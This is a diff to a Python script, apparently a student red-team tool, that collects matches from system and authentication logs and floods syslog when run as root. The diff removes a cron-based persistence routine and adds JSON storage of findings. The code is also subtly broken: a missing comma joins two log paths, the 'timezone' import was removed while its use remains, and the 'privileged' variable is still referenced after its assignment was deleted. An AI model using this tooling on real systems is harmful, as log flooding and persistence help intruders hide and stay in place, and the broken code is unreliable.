@@ -1,27 +1,30 @@
 #!/usr/bin/env python3
 # Seonho Park, scp4941@rit.edu
 
-import re
-import os
-import time
-import argparse
+import os, re, sys, json, time, socket, argparse, hashlib, threading, subprocess
+from datetime import datetime
+from pathlib import Path
+from collections import defaultdict
 import logging
-import hashlib
 from logging.handlers import SysLogHandler
-from datetime import datetime, timezone
 
-import subprocess
-import sys
+# ---------------- CONFIG ----------------
 
-# Configurations
-MAX_RATE = 50          # max messages/sec (DOS safeguard)
-MAX_DURATION = 300     # seconds (5 min cap)
+MAX_RATE = 50          # max messages/sec as a DOS safeguard
+MAX_DURATION = 300     # seconds; 300s = 5 min cap
+
 DEFAULT_LOGS = [
     "/var/log/syslog",
     "/var/log/auth.log",
     "/var/log/messages"
+    "/var/log/secure",
 ]
-TAG = "RT"
+STORAGE_DIR = Path("./rt_logs")
+
+# ---------------- ENV ----------------
+
+def is_root():
+    return os.geteuid() == 0
 
 # ---------------------------------------------------------------------------
 # Pattern-based log analysis / info extraction
@@ -79,9 +82,60 @@ def extract_info(log_paths: list[str], keywords: list[str],) -> list[dict]:
 
     return findings
 
-# Checks if user is privileged
-def is_privileged():
-    return os.geteuid() == 0
+# ---------------------------------------------------------------------------
+# Structured local storage
+# ---------------------------------------------------------------------------
+
+def save_findings(findings: list[dict], storage_dir: Path) -> Path:
+    """
+    Persist findings to a timestamped JSON file in *storage_dir*.
+
+    The directory is created if it does not already exist.
+    Returns the path of the written file.
+    """
+    storage_dir.mkdir(parents=True, exist_ok=True)
+    ts      = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
+    outfile = storage_dir / f"findings_{ts}.json"
+
+    with open(outfile, "w") as fh:
+        json.dump(
+            {
+                "generated":  ts,
+                "total":      len(findings),
+                "findings":   findings,
+            },
+            fh,
+            indent=2,
+        )
+
+    return outfile
+
+
+def load_findings(storage_dir: Path) -> list[dict]:
+    """
+    Load and merge all previously saved finding files from *storage_dir*.
+
+    Duplicates are removed based on the SHA-256 hash of each log line.
+    """
+    if not storage_dir.exists():
+        return []
+
+    seen:   set[str]   = set()
+    merged: list[dict] = []
+
+    for jf in sorted(storage_dir.glob("findings_*.json")):
+        try:
+            with open(jf) as fh:
+                data = json.load(fh)
+            for entry in data.get("findings", []):
+                h = entry.get("hash", "")
+                if h and h not in seen:
+                    seen.add(h)
+                    merged.append(entry)
+        except (json.JSONDecodeError, KeyError):
+            continue
+
+    return merged
 
 # Reads logs accessible to current users and returns raw log lines
 def read_logs(log_paths):
@@ -135,28 +189,6 @@ def flood_logs(rate, duration):
 
     print(f"[+] Flood complete ({counter} entries written)")
 
-def create_cron_persistence(script_path):
-    cron_job = f"*/5 * * * * /usr/bin/python3 {script_path}\n"
-    
-    try:
-        # Get current crontab
-        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
-        current_cron = result.stdout if result.returncode == 0 else ""
-        
-        # Append new job
-        new_cron = current_cron + cron_job
-        
-        # Write back
-        process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
-        process.communicate(input=new_cron)
-        
-        print("[+] Cron persistence established (every 5 minutes)")
-        return True
-    except Exception as e:
-        print(f"[-] Cron setup failed: {e}")
-        return False
-
-
 def main():
     parser = argparse.ArgumentParser(
         description="Log collection and flood tool"
@@ -191,7 +223,6 @@ def main():
 
     args = parser.parse_args()
 
-    privileged = is_privileged()
 
     print(f"[+] Running as {'root' if privileged else 'unprivileged'} user")
 
@@ -205,12 +236,11 @@ def main():
     print(f"[+] {len(entries)} total log entries read")
 
     # Log flooding
-    if args.enable_flood:
-        if not privileged:
+    if args.flood:
+        if not is_root():
             print("[-] Flooding requires root privileges.")
         else:
             flood_logs(args.rate, args.duration)
-
 
 if __name__ == "__main__":
     main()
